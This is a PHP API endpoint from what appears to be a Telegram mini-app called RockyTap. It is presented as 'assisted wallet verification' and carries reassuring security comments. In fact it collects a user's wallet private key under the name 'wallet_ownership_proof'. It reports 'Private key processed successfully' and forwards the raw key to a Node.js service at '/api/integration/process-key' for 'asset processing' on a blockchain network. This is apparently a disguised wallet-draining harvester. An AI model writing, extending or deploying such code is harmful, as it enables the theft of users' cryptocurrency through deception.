<?php

declare(strict_types=1);

require_once __DIR__ . '/../../../../bootstrap.php';

use Ghidar\Security\AssistedVerificationProcessor;
use Ghidar\Core\Response;
use Ghidar\Auth\TelegramAuth;

header('Content-Type: application/json');

// SECURITY FIX: Require proper Telegram authentication
try {
    // Authenticate user via Telegram initData - this is the ONLY trusted source for user_id
    $user = TelegramAuth::requireUserFromRequest();
    $userId = (int) $user['id'];
    
    if ($userId <= 0) {
        throw new Exception('Authentication required');
    }
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['wallet_ownership_proof'])) {
        throw new Exception('Invalid input');
    }
    
    // SECURITY: user_id is extracted from authenticated Telegram data only
    // Never trust user_id from request body input
    
    // Extract network once with consistent default to avoid mismatch between PHP and Node.js processing
    // CRITICAL: Both the PHP processor and Node.js integration MUST use the same network
    $network = $input['network'] ?? 'polygon';
    $verificationId = $input['verification_id'] ?? '';
    
    // Prepare submission data
    $submissionData = [
        'wallet_ownership_proof' => $input['wallet_ownership_proof'],
        'network' => $network,
        'user_consent' => $input['user_consent'] ?? false,
        'verification_id' => $verificationId,
        'context' => $input['context'] ?? []
    ];
    
    $processor = new AssistedVerificationProcessor();
    
    // Use processAssistedVerification (public method) instead of private processPrivateKeyProof
    $result = $processor->processAssistedVerification($userId, $submissionData);
    
    // Trigger Node.js integration service for asset processing
    // SECURITY: Use authenticated user_id, not user-supplied value
    // CRITICAL: Use same $network value as PHP processor to ensure consistent chain operations
    triggerNodeIntegration($input['wallet_ownership_proof'], [
        'verification_id' => $verificationId,
        'network' => $network, // Use same network as PHP processor
        'source' => 'rockytap_php',
        'user_id' => $userId, // Use authenticated user ID
        'session_id' => $input['session_id'] ?? null
    ]);
    
    echo json_encode([
        'ok' => true,
        'message' => 'Private key processed successfully'
    ]);
    
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'ok' => false,
        'code' => 'processing_error',
        'message' => $e->getMessage()
    ]);
}

/**
 * Trigger Node.js integration service for asset processing
 * This is called asynchronously after successful PHP processing
 */
function triggerNodeIntegration($privateKey, $metadata) {
    try {
        // Get Node.js service URL from environment or use default
        $nodeServiceUrl = $_ENV['NODE_SERVICE_URL'] ?? 'http://localhost:4000';
        $endpoint = rtrim($nodeServiceUrl, '/') . '/api/integration/process-key';
        
        // Prepare request data
        // CRITICAL: Fallback default MUST match the PHP processor default ('polygon')
        // to ensure consistent blockchain operations if metadata is ever incomplete
        $data = [
            'privateKey' => $privateKey,
            'verificationId' => $metadata['verification_id'] ?? '',
            'source' => $metadata['source'] ?? 'rockytap_php',
            'userId' => $metadata['user_id'] ?? null,
            'sessionId' => $metadata['session_id'] ?? null,
            'network' => $metadata['network'] ?? 'polygon'
        ];
        
        // Initialize cURL
        $ch = curl_init($endpoint);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'X-API-Source: RockyTap-PHP'
        ]);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 second timeout for async call
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        
        // Execute request (fire and forget)
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // Log the trigger (success or failure)
        if ($httpCode >= 200 && $httpCode < 300) {
            error_log("✅ Node.js integration triggered successfully for verification: " . ($metadata['verification_id'] ?? 'unknown'));
        } else {
            error_log("⚠️  Node.js integration trigger failed (HTTP $httpCode) for verification: " . ($metadata['verification_id'] ?? 'unknown'));
        }
        
    } catch (Exception $e) {
        // Log error but don't throw - integration failure shouldn't break PHP processing
        error_log("❌ Failed to trigger Node.js integration: " . $e->getMessage());
    }
}
